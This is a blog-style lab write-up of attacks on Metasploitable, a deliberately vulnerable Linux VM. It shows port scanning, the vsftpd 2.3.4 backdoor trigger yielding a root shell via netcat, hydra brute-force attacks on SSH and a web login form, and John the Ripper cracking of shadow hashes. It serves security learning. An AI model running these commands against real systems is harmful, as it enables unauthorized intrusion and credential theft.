---
title: Learning Linux hacking with Metasploitable
date: 2020-02-27T00:24:00.000Z
description: Learning Linux hacking by attacking a Metasploitable virtual environment
tags: ['Security', 'Linux']
---

I learned about Linux hacking by trying attacks against Metasploitable, a Linux virtual machine intentionally set up with vulnerabilities. Here is a summary of the attacks I tried.

## Warning

This article is written for learning about security by understanding attack methods. The experiments are run in a virtual environment.
Please never run these against external systems.

## References

[Creating a Hacking Lab: Hacker Experience Learning in a Virtual Environment](https://www.shoeisha.co.jp/book/detail/9784798155302)
Chapter 5: "Hacking Metasploitable"

## Tool list

* Netcat
  * A CLI tool for sending and receiving data using TCP/UDP connections
  * A versatile tool useful for file transfer and many other purposes
* nmap
  * Identifies open port numbers on a target (port scanning)
* [Exploit-DB](https://www.exploit-db.com/), [CVE Details](https://www.cvedetails.com/)
  * Services for searching vulnerabilities
* hydra
  * An online password cracking tool
* John the Ripper
  * A tool for analyzing encrypted passwords
  * Analyzes encrypted passwords from Linux `/etc/shadow` or web service databases and recovers the original strings
* wireshark
  * A packet capture tool
  * Captures packets in a network to analyze what kind of communication is happening and where

## Port scanning

-p-: Target port numbers 1 to 65535
-sV: Detect the version of services on each port
-O: Identify the target OS

```
$ nmap -sV -O -p- <IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-27 00:28 JST
Nmap scan report for 10.0.0.5
Host is up (0.00068s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
...
```

## Using the vsftpd backdoor

vsftpd 2.3.4 contains a backdoor that allows remote command execution.
(It was inserted on 2011/06/30 and fixed on 2011/07/03.)
Logging into FTP with a username containing `:)` opens a backdoor on port 6200 (TCP).

```
$ nc <target IP> 21
220 (vsFTPd 2.3.4)
USER hoge:)
331 Please specify the password.
PASS hoge
```

Checking in another terminal confirms that port 6200 is open.

```
$ nmap -p 6200 <IP>
PORT     STATE SERVICE
6200/tcp open  lm-x
```

Since the backdoor is open on port 6200, connect to it from another terminal.

```
$ nc -nv <IP> 6200
(UNKNOWN) [<IP>] 6200 (?) open
whoami # Run a command
root   # Result is returned
```

## Dictionary attack to crack SSH credentials

```
# Create a user dictionary file
$ cat > user.lst
root
sys
...

# Create a password dictionary file
$ cat > pass.lst
root
passwd
...

# Run a brute force attack using the dictionary files
$ hydra -L user.lst -P pass.lst -t 4 <IP> ssh
```

## Cracking encrypted passwords

Use John the Ripper to crack passwords.
Save the passwords you want to crack in a file with the format `username:encrypted_password` and run the command.

```
$ cat passwords
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::

# Crack by brute force (takes a very long time)
$ john --incremental passwords
```

## Cracking HTTP authentication

Use hydra to run a dictionary attack against an authentication page to find valid ID and password combinations.
The format for http-form-post is `<auth API path>:<POST parameters>:<string shown in the response on authentication failure>`.
Check the target URL and POST parameter structure using packet capture tools like wireshark.

```
$ hydra -L user.lst -P pass.lst -s <web service port> <target IP> http-form-post "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
```
